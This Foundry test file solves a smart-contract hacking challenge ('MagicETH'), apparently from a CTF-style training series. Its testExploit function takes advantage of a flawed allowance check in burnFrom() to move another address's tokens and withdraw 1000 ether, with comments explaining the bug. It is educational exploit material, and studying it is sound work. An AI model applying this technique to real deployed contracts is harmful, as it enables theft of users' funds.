// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/

        // vulnerability:
        // burnFrom() is incorrectly setting the allowance of the contract to use msg.sender so
        // we can modify the allowance of any address in the contract

        // first we need to approve the whitehat contract to burn tokens from the exploiter
        mETH.approve(exploiter, 1000000000 ether);
        // then we can call burnFrom() from the whitehat contract to burn tokens from the exploiter
        mETH.burnFrom(exploiter, 0 ether);
        // then we send the erc20 tokens to the whitehat contract
        mETH.transferFrom(exploiter, whitehat, 1000 ether);
        // then we can call withdraw() from the whitehat contract to withdraw ether from the contract
        mETH.withdraw(1000 ether);

        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}
